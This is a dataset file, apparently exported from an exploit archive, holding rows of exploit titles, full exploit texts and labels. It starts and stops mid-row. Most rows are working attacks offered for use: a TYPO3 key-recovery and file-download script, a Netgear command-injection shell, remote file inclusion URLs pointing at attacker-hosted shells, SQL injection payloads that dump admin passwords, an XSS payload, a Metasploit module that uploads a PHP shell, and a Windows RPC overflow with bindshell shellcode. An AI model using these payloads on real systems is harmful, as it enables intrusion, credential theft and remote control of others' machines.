CURLOPT_VERBOSE, TRUE):curl_setopt($ch, CURLOPT_VERBOSE, FALSE); curl_setopt($ch, CURLOPT_POST, 1); if(isset($proxy)){  	curl_setopt($ch, CURLOPT_PROXY, $proxy); } curl_setopt($ch, CURLOPT_POSTFIELDS,""id="".$id.""&type=0&jumpurl="".$jumpurl.""&juSecure=1&locationData="".$locationData.""&juHash="".$juHash); $output=curl_exec($ch);  if(stristr($output,""did not match"")) { 	echo(""[*] TYPO3 successfully detected!\n""); }else{ 	echo(""[!] A problem occurred while detecting the remote TYPO3 installation\n""); 	exit; } curl_close ($ch);  /* STEP 2 - Retrieve $TYPO3_CONF_VARS['SYS']['encryptionKey'] from /typo3conf/localconf.php */ $mh = curl_multi_init(); $handles = array(); $location = $locationData; //locationData with padding  for($i=0;$i<$reqs;$i++){ 		$ch = curl_init(); //create a new single curl handle     	curl_setopt($ch, CURLOPT_URL, $url);     	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);      	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     	curl_setopt($ch, CURLOPT_POST, 1);     	if(isset($proxy)){ 			curl_setopt($ch, CURLOPT_PROXY, $proxy);     	}     	$location = ""%20"".$location;     	curl_setopt($ch, CURLOPT_POSTFIELDS,""id="".$id.""&type=0&jumpurl="".$jumpurl.""&juSecure=1&locationData="".$location.""&juHash="".$juHash);      	curl_multi_add_handle($mh,$ch);     	$handles[] = $ch; // put the handles in an array to loop }  echo(""[*] Starting TYPO3's encryption key retrieval\n""); echo(""[*] Padding locationData to force '0exxxxxx' strings. It may take a while."");  $rcont=0; while(!stristr($output,""TYPO3_CONF_VARS['SYS']['encryptionKey']"")){ 	$running=null;   	do{ 		curl_multi_exec($mh,$running);   	} while ($running > 0);  	for($i=0;$i<count($handles);$i++){ 		$output = curl_multi_getcontent($handles[$i]);     	$location=""%20"".$location;     	curl_multi_remove_handle($mh,$handles[$i]);     	curl_setopt($handles[$i], CURLOPT_POSTFIELDS,""id="".$id.""&type=0&jumpurl="".$jumpurl.""&juSecure=1&locationData="".$location.""&juHash="".$juHash);     	curl_multi_add_handle($mh,$handles[$i]); 		$rcont++;     	echo(""."");   	} }  curl_multi_remove_handle($mh,$handles[$i]);  curl_multi_close($mh);  $key=substr($output,strpos($output,""TYPO3_CONF_VARS['SYS']['encryptionKey'] = '"")+43); $key=substr($key,0,strpos($key,""';"")); echo(""\n[*] Done! "".$rcont."" requests\n""); echo(""\n[*] TYPO3's encryption key:"".$key.""\n"");  /* STEP 3 - Retrieve arbitrary files */ while(!0) { 	echo(""\n[*] Which file do you want to download?\n""); 	echo(""[*] Please make your selection (e.g. '/etc/passwd'):\n\n""); 	$jumpurl=trim(fgets(STDIN,256)); 	/* Generate a valid hash as in the TYPO3 codebase*/ 	 	$hArr= array($jumpurl,$locationData,$key); 	$juHash=substr(md5(serialize($hArr)),0,10);;  	$ch=curl_init(); 	curl_setopt($ch, CURLOPT_URL, $url); 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 	DEBUG ? curl_setopt($ch, CURLOPT_VERBOSE, TRUE):curl_setopt($ch, CURLOPT_VERBOSE, FALSE); 	curl_setopt($ch, CURLOPT_POST, 1);     if(isset($proxy)){  		curl_setopt($ch, CURLOPT_PROXY, $proxy);     } 	curl_setopt($ch, CURLOPT_POSTFIELDS,""id="".$id.""&type=0&jumpurl="".$jumpurl.""&juSecure=1&locationData="".$locationData.""&juHash="".$juHash); 	$output=curl_exec($ch);  	echo(""\n[*]------------------------------------------------------------------------------\n\n""); 	if(!stristr($output,""not a valid"")) echo $output; 	else echo(""[!] An error occurred while retriving '"".$jumpurl.""'\n""); 	echo(""\n\n[*]------------------------------------------------------------------------------\n"");  	curl_close ($ch); }",typo3,1
41459,"Netgear DGN2200v1/v2/v3/v4 - 'dnslookup.cgi' Remote Command Execution #!/usr/bin/python  #Provides access to default user account, privileges can be easily elevated by using either: # - a kernel exploit (ex. memodipper was tested and it worked) # - by executing /bin/bd (suid backdoor present on SOME but not all versions) # - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon)   #Pozdrawiam: Kornela, Komara i Sknerusa  import sys import requests   #You can change these credentials to ex. Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions #These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to   login = 'admin' password = 'password'   def main():     if len(sys.argv) < 2:         print ""./netgearpwn_2.py <router ip>""         return     spawnShell()  def execute(cmd): #Escaping basic sanitization     requests.post(""http://"" + sys.argv[1] + ""/dnslookup.cgi"", data={'host_name':""www.google.com; "" + cmd, 'lookup': ""Lookup""}, auth=(login, password))     return  def spawnShell():     print ""Dropping a shell-like environment (blind OS injection)""     print ""To test it type 'reboot'""     while True:         cmd = raw_input(""[blind $] "")         execute(cmd)   if __name__ == ""__main__"":     main()  #2017-02-25 by SivertPL #Tak, to ja.",.google.,1
4838,"snetworks PHP Classifieds 5.0 - Remote File Inclusion +______________________________________________By Crackers_Child___________________________________________+  * * *    [~] Script.......:       SNETWORKS PHP CLASSIFIEDS *    [~] Page.........:       http://www.snetworks.biz/ *    [~] Author.......:       Crackers_Child  | cybermilitan@hotmail.com & localexploit@hotmail.com *    [~] Class........:       Remote File Ä°nclude Vulnerability *    [~] Demo.........:       http://xxxclassifieds.com/classifieds/ *    [~] Dork.........:       Powered by SNETWORKS PHP CLASSIFIEDS +_______________________________________________________________________________________________________________________+   +_______________________________________________________________________________________________________________________+ * * *     * *       [~] Exploit Rfi...:     http://[Taget]/[Path]/config.inc.php?path_escape= http://www.sibersavascilar.com/cr/r57.txt? * * * *                             +_______________________________________________________________________________________________________________________+            [~] Ä°nfo......: Can Yakar . . .                          +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ * * *       [~] Special Thanx.......:    str0ke, BiyoFrm.com,BiyoSecurity.Net, SiberSavascilar.com And All F3ckers :) * +_______________________________________________________________________________________________________________________+  # milw0rm.com [2008-01-05]",.s,0
41438,"WordPress Plugin Mail Masta 1.0 - SQL Injection # Exploit Title: Multiple SQL injection vulnerabilities in Mail Masta (aka mail-masta) plugin 1.0 for Wordpress. # Date: 02/18/2017 # Exploit Author: Hanley Shun # Vendor Homepage: https://wpcore.com/plugin/mail-masta # Software Link: https://www.exploit-db.com/apps/78745b48b15bf2b81153556ef1c8ec48-mail-masta.zip # Version: 1.0 # Tested on: Kali Linux x64, Ubuntu 14.04 x64 # CVE : [CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098]   Mail-Masta SQL Injection  Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated)  GET Parameter: list_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php   csvexport.php:  $list_id=$_GET['list_id']; global $wpdb; $mail_subscribers = $wpdb->prefix . ""masta_subscribers""; $masta_list = $wpdb->prefix . ""masta_list""; $check_sql = ""SELECT * FROM $mail_subscribers WHERE list_id = $list_id""; $check_list=""SELECT * FROM $masta_list WHERE list_id= $list_id""; $wp_list=$wpdb->get_results($check_sql); $wp_list_s=$wpdb->get_results($check_list);   Page: ./wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires Wordpress admin)  GET Parameter: filter_list  http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1   view-list.php:  global $wpdb; $list_id = $_GET['filter_list']; $masta_list = $wpdb->prefix . ""masta_list""; $masta_subscribers = $wpdb->prefix . ""masta_subscribers""; $listdata = $wpdb->get_results( $wpdb->prepare(""SELECT * FROM $masta_list WHERE list_id= $list_id"",$query)); $list_subscribers = $wpdb->get_var( $wpdb->prepare(""SELECT COUNT( `list_id` ) FROM $masta_subscribers WHERE list_id= $list_id AND status=1"",$query));   Page: ./wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires Wordpress admin)  POST Parameter: camp_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php   count_of_send.php:  include($_GET['pl']); global $wpdb; $camp_id=$_POST['camp_id']; $masta_reports = $wpdb->prefix . ""masta_reports""; $count=$wpdb->get_results(""SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1"");   Page: ./wp-content/plugins/mail-masta/inc/campaign_save.php (Requires Wordpress admin)  POST Parameter: list_id  campaign_save.php:  $list_id=$_POST['list_id']; $check_list = $wpdb->get_var(""SELECT count(id) FROM wp_masta_subscribers where list_id=$list_id"");   POST /wp-admin/admin-ajax.php?id= HTTP/1.1  ...snip...  action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1",WordPress,1
6660,"RhinoSoft Serv-U FTP Server 7.3 - (Authenticated) 'stou con:1' Denial of Service #Serv-U <= 7.2.0.1 / 7.3 ftp server DoS #user must have upload permissions # #(x) dmnt 2008-10-01   220 Serv-U FTP Server v7.3 ready... user test 331 User name okay, need password. pass test 230 User logged in, proceed. stou con:1 quit 221 Goodbye, closing session. # now server DoS'ed  # milw0rm.com [2008-10-03]",RhinoSoft,1
9699,"Micro CMS 3.5 - SQL Injection / Local File Inclusion ################################################# #        Micro CMS File inclusion Vuln		# #	 Micro CMS SQLi login bypass		# #	 By learn3r hacker from Nepal		# #	  damagicalhacker@gmail.com		# #################################################  Affected version: v 3.5 or may be lower...  ############################################# #			File Inclusion Vuln				# #############################################  Requires register globals to be on...  Vuln file: microcms-inlude.php http://localhost/exploit/microcms/micro_cms_files/microcms-include.php?microcms_path=[FileInclusion]%00   ############################################# #			SQLi Login Bypass				# #############################################  Vuln file: microcms-admin-login.php  Username: valid_username/*   [eg. admin/*] Password: learn3r  [or whatever]  Or Username: "" or 1=1/* Password: learn3r  [or whatever]    Greetz to: sToRm and m0nkee from #gny, sam207 from www.sampctricks.blogspot.com, nepali boka, l@d0_put! HaCKeR and all... FuCK MaKuNe, G!r!ja, Prachanda and all political leaders of Nepal K!ll Upendra Yadav and Vijay Gachhedhaar  By learn3r aka cyb3r lord Nepali Hackerz Are Not Dead!!!  # milw0rm.com [2009-09-16]",.sampctricks.blogspot.,1
6250,"deeemm CMS (dmcms) 0.7.4 - Multiple Vulnerabilities ##################################################################################### ####                        DeeEmm CMS Sql Injection/Rfi                         #### ##################################################################################### #                                                                                   # #AUTHOR : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                                      # #Discovered by : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                               # #Our Site : Http://IRCRASH.COM                                                      # #IRCRASH Team Members : Dr.Crash - R3d.w0rm (Sina Yazdanmehr)                       # ##################################################################################### #                                                                                   # #Script Download : http://surfnet.dl.sourceforge.net/sourceforge/dmcms/dmcms_074.tar.gz #                                                                                   # #Home Page : www.deeemm.com                                                         # #                                                                                   # #DORK : ""DeeEmm CMS""                                                                # #                                                                                   # ##################################################################################### #                                      [Rfi]                                        # #                                                                                   # #http://Site/user_language.php?INDM=r3d.w0rm&language_dir=http://evil-site.com/shell.txt? #                                                                                   # #                                 [Sql Injection]                                   # #                                                                                   # #http://Site/index.php?page=media`+union+select+0,1,2,4,5,6,7,8,9,user_name,11,password,13,14,15,16,17,18,19,20,21+from+deeemm_users/*                                # #http://Site/index.php?page=media&id=-99999+union+select+0,1,2,4,5,6,7,8,9,user_name,11,password,13,14,15,16,17,18,19,20,21+from+deeemm_users                                # #                                                                                   # ##################################################################################### #                           Site : Http://IRCRASH.COM                               # ###################################### TNX GOD ######################################  # milw0rm.com [2008-08-15]",deeemm,1
44538,HRSALE The Ultimate HRM 1.0.2 - (Authenticated) Cross-Site Scripting # Exploit Title: HRSALE The Ultimate HRM 1.0.2 - Authenticated Cross Site Scripting # Date: 2018-04-23 # Exploit Author: 8bitsec # CVE: CVE-2018-10259 # Vendor Homepage: https://codecanyon.net/ # Software Link: https://codecanyon.net/item/hrsale-the-ultimate-hrm/21665619 # Version: 1.0.2 # Tested on: [Kali Linux 2.0 | Mac OS 10.13]  Release Date: ============= 2018-04-23  Product & Service Introduction: =============================== HRSALE provides you with a powerful and cost-effective HR platform to ensure you get the best from your employees and managers.  Technical Details & Description: ================================  Authenticated Stored XSS vulnerability found logged as low privileged user.  Proof of Concept (PoC): =======================  Authenticated Stored XSS:  Dashboard > My Profile. Write the payload on the 'First Name' input field: john doe<script>alert()</script>,HRSALE,1
3510,"ScriptMagix Recipes 2.0 - 'index.php?catid' SQL Injection #!/usr/bin/perl #[Script Name: ScriptMagix Recipes <= 2.0 (index.php catid) Remote Blind SQL Injection Exploit #[Coded by   : ajann #[Author     : ajann #[Contact    : :( #[S.Page     : http://www.scriptmagix.com #[$$         : 35$ #[..         : ajann,Turkey  use IO::Socket; if(@ARGV < 1){ print "" [======================================================================== [//   ScriptMagix Recipes <= 2.0 (index.php catid) Remote Blind SQL Injection Exploit [//                   Usage: exploit.pl [target] [//                   Example: exploit.pl victim.com [//                   Example: exploit.pl victim.com [//                           Vuln&Exp : ajann [======================================================================== ""; exit(); } #Local variables $server = $ARGV[0]; $server =~ s/(http:\/\/)//eg; $host = ""http://"".$server; $port = ""80""; $file = ""/index.php?catid="";  print ""Script <DIR> : ""; $dir = <STDIN>; chop ($dir);  if ($dir =~ /exit/){ print ""-- Exploit Failed[You Are Exited] \n""; exit(); }  if ($dir =~ /\//){} else { print ""-- Exploit Failed[No DIR] \n""; exit();  }   $target = ""-1%20union%20select%200,1,2,3,4,5,6,7,1,2,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),4,0%20from%20admin/*""; $target = $host.$dir.$file.$target;  #Writing data to socket print ""+**********************************************************************+\n""; print ""+ Trying to connect: $server\n""; $socket = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""$port"") || die ""\n+ Connection failed...\n""; print $socket ""GET $target HTTP/1.1\n""; print $socket ""Host: $server\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""+ Connected!...\n""; #Getting while($answer = <$socket>) { if ($answer =~ /username:(.*?)pass/){ print ""+ Exploit succeed! Getting admin information.\n""; print ""+ ---------------- +\n""; print ""+ Username: $1\n""; }  if ($answer =~ /password:(.*?)<\/a>/){ print ""+ Password: $1\n""; }  if ($answer =~ /Syntax error/) {  print ""+ Exploit Failed : ( \n""; print ""+**********************************************************************+\n""; exit();  }  if ($answer =~ /Internal Server Error/) { print ""+ Exploit Failed : (  \n""; print ""+**********************************************************************+\n""; exit();  }  }  # milw0rm.com [2007-03-18]",.scriptmagix.,1
9312,"d.net CMS - Local File Inclusion / SQL Injection ############################################################################################################################################### [+] d.net CMS (LFI/SQLI) Multiple Remote Vulnerabilities [+] Discovered By SirGod [+] http://insecurity-ro.org [+] http://h4cky0u.org ###############################################################################################################################################  [+] Download : http://sourceforge.net/projects/dnet/  [+] SQL Injection   PoC's   - No admin required      http://127.0.0.1/path/index.php?page=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5, 6,7+from+cms_security_master+where+id=1--   - Admin required      http://127.0.0.1/path/dnet_admin/index.php?edit_id=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5, 6,7,8,9+from+cms_security_master+where+id=1--&_p=1&type=news      http://127.0.0.1/path/dnet_admin/index.php?edit_id=1&_p=null+union+all+select+1,2,concat_ws(0x3a,username,password),4, 5,6,7+from+cms_security_master+where+id=1--&type=news  [+] Local File Inclusion   - PoC   - Admin required      http://127.0.0.1/path/dnet_admin/index.php?edit_id=2&_p=2&type=../../../../../../boot.ini%00  ###############################################################################################################################################  # milw0rm.com [2009-07-30]",d.net,1
18108,"Support Incident Tracker 3.65 - Remote Command Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Support Incident Tracker <= 3.65 Remote Command Execution', 			'Description'    => %q{ 					This module combines two separate issues within Support Incident Tracker (<= 3.65) 				application to upload arbitrary data and thus execute a shell. The two issues exist 				in ftp_upload_file.php. 				The first vulnerability exposes the upload dir used to store attachments. 				The second vulnerability allows arbitrary file upload since there is no 				validation function to prevent from uploading any file type. 				Authentication is required to exploit both vulnerabilities. 			}, 			'Author'         => 				[ 					'Secunia Research', # Original discovery 					'juan vazquez'      # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					['CVE', 'CVE-2011-3829'], 					['CVE', 'CVE-2011-3833'], 					['OSVDB', '76999'], 					['OSVDB', '77003'], 					['URL', 'http://secunia.com/secunia_research/2011-75/'], 					['URL', 'http://secunia.com/secunia_research/2011-79/'], 				], 			'Privileged'     => false, 			'Payload'        => 				{ 					'DisableNops' => true, 					'Compat'      => 						{ 							'ConnectionType' => 'find', 						} 				}, 			'Platform'       => 'php', 			'Arch'           => ARCH_PHP, 			'Targets'        => [[ 'Automatic', { }]], 			'DisclosureDate' => 'Nov 10 2011', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('URI', [true, ""SiT! directory path"", ""/sit""]), 				OptString.new('USERNAME', [ true, 'The username to authenticate as','' ]), 				OptString.new('PASSWORD', [ true, 'The password for the specified username','' ]), 			], self.class) 	end  	def check  		if datastore['URI'][-1, 1] == ""/"" 			uri = datastore['URI'] + ""index.php"" 		else 			uri = datastore['URI'] + ""/index.php"" 		end  		res = send_request_raw({ 			'uri'     => uri 		})  		if (res and res.body =~ /SiT! Support Incident Tracker v(\d)\.(\d\d)/) 			ver = [ $1.to_i, $2.to_i ] 			print_status(""SiT! #{ver[0]}.#{ver[1]}"")  			if (ver[0] == 3 and ver[1] == 65) 				return Exploit::CheckCode::Vulnerable 			elsif (ver[0] == 3 and ver[1] < 65) 				return Exploit::CheckCode::Appears 			end 		end  		return Exploit::CheckCode::Safe 	end  	def retrieve_session(user, pass)  		if datastore['URI'][-1, 1] == ""/"" 			uri = datastore['URI'] + ""login.php"" 		else 			uri = datastore['URI'] + ""/login.php"" 		end  		res = send_request_cgi({ 			'uri'     => uri, 			'method'  => 'POST', 			'data'    => ""username=#{user}&password=#{pass}"", 		}, 25)  		if (res and res.code == 302 and res.headers['Location'] =~ /main.php/) 			print_status(""Successfully logged in as #{user}:#{pass}"")  			if (res.headers['Set-Cookie'] =~ /SiTsessionID/) and res.headers['Set-Cookie'].split(""SiTsessionID"")[-1] =~ /=(.*);/ 				session = $1 				print_status(""Successfully retrieved cookie: #{session}"") 				return session 			else 				raise RuntimeError, ""Error retrieving cookie!"" 			end 		else 			raise RuntimeError, ""Error logging in."" 		end 	end  	def upload_page(session, newpage, contents)  		if datastore['URI'][-1, 1] == ""/"" 			uri = datastore['URI'] + ""ftp_upload_file.php"" 		else 			uri = datastore['URI'] + ""/ftp_upload_file.php"" 		end  		boundary = rand_text_alphanumeric(6)  		data = ""--#{boundary}\r\n"" 		data << ""Content-Disposition: form-data; name=\""file\""; "" 		data << ""filename=\""#{newpage}\""\r\n"" 		data << ""Content-Type: application/x-httpd-php\r\n\r\n"" 		data << contents 		data << ""\r\n--#{boundary}\r\n"" 		data << ""Content-Disposition: form-data; name=\""shortdescription\""\r\n\r\n"" 		data << rand_text_alphanumeric(rand(10 + 10)) 		data << ""\r\n--#{boundary}\r\n"" 		data << ""Content-Disposition: form-data; name=\""longdescription\""\r\n\r\n"" 		data << rand_text_alphanumeric(rand(20) + 20) 		data << ""\r\n--#{boundary}\r\n"" 		data << ""Content-Disposition: form-data; name=\""fileversion\""\r\n\r\n"" 		data << ""1"" 		data << ""\r\n--#{boundary}\r\n"" 		data << ""Content-Disposition: form-data; name=\""action\""\r\n\r\n"" 		data << ""publish"" 		data << ""\r\n--#{boundary}--""  		res = send_request_raw({ 			'uri'	  => uri, 			'method'  => 'POST', 			'data'    => data, 			'headers' => 			{ 				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary, 				'Content-Length' => data.length, 				'Cookie'	 => ""SiTsessionID=#{session}"", 			} 		}, 25)  		if (res and res.code == 200) 			print_status(""Successfully uploaded #{newpage}"") 			return res 		else 			raise RuntimeError, ""Error uploading #{newpage}"" 		end 	end  	def retrieve_upload_dir(session) 		data =  rand_text_alphanumeric(rand(20)+20) 		filename = rand_text_alphanumeric(rand(256) + 300) 		res = upload_page(session, filename, data)  		if res.body =~ /attachments-(.*)\/#{filename}\): failed to open stream/ 			upload_dir = ""attachments-#{$1}"" 			print_status(""Successfully retrieved upload dir: #{upload_dir}"") 			return upload_dir 		else 			raise RuntimeError, ""Error retrieving the upload dir"" 		end  	end  	def cmd_shell(cmdpath) 		print_status(""Calling payload: #{cmdpath}"")  		if datastore['URI'][-1, 1] == ""/"" 			uri = datastore['URI'] + cmdpath 		else 			uri = datastore['URI'] + ""/#{cmdpath}"" 		end  		send_request_raw({ 			'uri'	=> uri 		}, 25) 		return 	end  	def exploit 		cmd_php = '<?php ' + payload.encoded + '?>' 		cmdscript   = rand_text_alphanumeric(rand(10)+10) + '.php' 		user        = datastore['USERNAME'] 		pass        = datastore['PASSWORD']  		session = retrieve_session(user, pass) 		upload_dir = retrieve_upload_dir(session) # CVE-2011-3829 		upload_page(session, cmdscript, cmd_php) # CVE-2011-3833 		cmdpath = ""#{upload_dir}/#{cmdscript}"" 		cmd_shell(cmdpath) 		handler 	end end",turnkeylinux,1
4745,"Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) (1) /* Windows Message Queuing Service Remote RPC BOF Exploit (MS07-065) by axis http://www.ph4nt0m.org     you should know the dnsname of target to trigger this vuln   the service runs on port 2103/2105/2107   D:\soft\develop\MyProjects\temp\Debug>temp.exe -h 192.168.152.100 -p 2103 -------------------------------------------------------------------------- -== Windows Message Queuing Service Remote RPC BOF Exploit (MS07-065) ==- -== code by axis@ph4nt0m ==- -== Http://www.ph4nt0m.org ==- -== Tested against Windows 2000 server SP4 ==- --------------------------------------------------------------------------   [+] Attacking default port 2103 [*]Sending our Payload, Good Luck! ^_^ [*]Sending RPC Bind String! [*]Sending RPC Request Now!   D:\soft\develop\MyProjects\temp\Debug>     D:\>nc -vv -n 192.168.152.100 1154 (UNKNOWN) [192.168.152.100] 1154 (?) open: unknown socket error Microsoft Windows 2000 [Version 5.00.2195] (C) ç‰ˆæƒæ‰€æœ‰ 1985-2000 Microsoft Corp.   C:\WINNT\system32>exit exit sent 5, rcvd 109: NOTSOCK   D:\>     */ #include <stdio.h> #include <stdlib.h> #include <ctype.h> #include <winsock.h> #include <io.h> #pragma comment(lib,""ws2_32"")   // RPC Bind UUID: fdb3a030-065f-11d1-bb9b-00a024ea5525 v1.0 char bind_str[] = { 0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x30, 0xa0, 0xb3, 0xfd, 0x5f, 0x06, 0xd1, 0x11, 0xbb, 0x9b, 0x00, 0xa0, 0x24, 0xea, 0x55, 0x25, 0x01, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };     // RPC Request  Opnum: 0x06  char request_1[] = { 0x05, 0x00, 0x00, 0x81, 0x10, 0x00, 0x00, 0x00, 0xd0, 0x16, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x98, 0x17, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x30, 0xa0, 0xb3, 0xfd, 0x5f, 0x06, 0xd1, 0x11, 0xbb, 0x9b, 0x00, 0xa0, 0x24, 0xea, 0x55, 0x25, 0x01, 0x00, 0x00, 0x00, 0xba, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x0b, 0x00, 0x00, 0x61, 0x00, 0x2d, 0x00, 0x64, 0x00, 0x64, 0x00,  // target's dns name (unicode) 0x61, 0x00, 0x34, 0x00, 0x31, 0x00, 0x33, 0x00, 0x39, 0x00, 0x38, 0x00, 0x66, 0x00, 0x34, 0x00, 0x34, 0x00, 0x66, 0x00, 0x34, 0x00, 0x2e, 0x00, 0x66, 0x00, 0x75, 0x00, 0x63, 0x00, 0x6b, 0x00, 0x5c, 0x00, 0x00, 0xcc, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xeb, 0x06, 0x42, 0x42, 0x32, 0xb0,     // \xeb\x06\x42\x42 jmpcode 0x01, 0x78, 0x2b, 0xc9, 0x83, 0xe9, 0xb0, 0xd9,     //  overwrite seh ; call ebx 0xee, 0xd9, 0x74, 0x24, 0xf4, 0x5b, 0x81, 0x73,     //  bindshell on port 1154, metasploit shellcode 0x13, 0x1d, 0x82, 0x67, 0xb4, 0x83, 0xeb, 0xfc, 0xe2, 0xf4, 0xe1, 0xe8, 0x8c, 0xf9, 0xf5, 0x7b, 0x98, 0x4b, 0xe2, 0xe2, 0xec, 0xd8, 0x39, 0xa6, 0xec, 0xf1, 0x21, 0x09, 0x1b, 0xb1, 0x65, 0x83, 0x88, 0x3f, 0x52, 0x9a, 0xec, 0xeb, 0x3d, 0x83, 0x8c, 0xfd, 0x96, 0xb6, 0xec, 0xb5, 0xf3, 0xb3, 0xa7, 0x2d, 0xb1, 0x06, 0xa7, 0xc0, 0x1a, 0x43, 0xad, 0xb9, 0x1c, 0x40, 0x8c, 0x40, 0x26, 0xd6, 0x43, 0x9c, 0x68, 0x67, 0xec, 0xeb, 0x39, 0x83, 0x8c, 0xd2, 0x96, 0x8e, 0x2c, 0x3f, 0x42, 0x9e, 0x66, 0x5f, 0x1e, 0xae, 0xec, 0x3d, 0x71, 0xa6, 0x7b, 0xd5, 0xde, 0xb3, 0xbc, 0xd0, 0x96, 0xc1, 0x57, 0x3f, 0x5d, 0x8e, 0xec, 0xc4, 0x01, 0x2f, 0xec, 0xf4, 0x15, 0xdc, 0x0f, 0x3a, 0x53, 0x8c, 0x8b, 0xe4, 0xe2, 0x54, 0x01, 0xe7, 0x7b, 0xea, 0x54, 0x86, 0x75, 0xf5, 0x14, 0x86, 0x42, 0xd6, 0x98, 0x64, 0x75, 0x49, 0x8a, 0x48, 0x26, 0xd2, 0x98, 0x62, 0x42, 0x0b, 0x82, 0xd2, 0x9c, 0x6f, 0x6f, 0xb6, 0x48, 0xe8, 0x65, 0x4b, 0xcd, 0xea, 0xbe, 0xbd, 0xe8, 0x2f, 0x30, 